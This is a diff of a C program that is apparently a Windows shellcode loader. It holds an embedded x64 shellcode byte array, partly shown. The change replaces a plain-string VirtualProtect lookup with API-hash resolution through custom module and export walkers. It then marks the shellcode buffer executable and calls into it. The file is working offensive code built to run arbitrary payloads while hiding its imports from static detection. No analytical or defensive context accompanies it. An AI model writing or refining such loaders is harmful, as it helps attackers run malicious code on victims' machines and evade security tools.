@@ -1,8 +1,9 @@
 ﻿#include <stdio.h>
 #include <Windows.h>
-#include "peb_utils.h"
+#include "shcutils.h"
 
 int main() {
+    typedef int(*VirtualProtect_t)(void*, int, unsigned long, unsigned long*);
     char shellcode[] =
         "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
         "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
@@ -33,25 +34,16 @@ int main() {
         "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
         "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
         "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
+
     wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
-    char virtual_protect_name[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0};
-    LPVOID base = get_module_handle((const LPWSTR)kernel32_dll_name);
-
-    if (!base) {
-        return 1;
+    void* base = get_module_handle(kernel32_dll_name);
+    if (base) {
+        VirtualProtect_t VMProtect = (VirtualProtect_t) get_proc_address(base, HASH("VirtualProtect"));
+        if (VMProtect) {
+            DWORD flOldProtect;
+            VMProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &flOldProtect);
+            (*(void (*)()) & shellcode)();
+        }
     }
-    LPVOID virtual_protect = get_proc_address((HMODULE)base, (LPSTR)virtual_protect_name);
-    if (!virtual_protect) {
-        return 1;
-    }
-    auto VirtualProtectP = (int (WINAPI*)(
-        _In_opt_ LPVOID,
-        _In_opt_ SIZE_T,
-        _In_opt_ DWORD,
-        _In_ PDWORD))virtual_protect;
-
-    DWORD flOldProtect;
-    VirtualProtectP(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &flOldProtect);
-    (*(void (*)()) & shellcode)();
     return 0;
 }
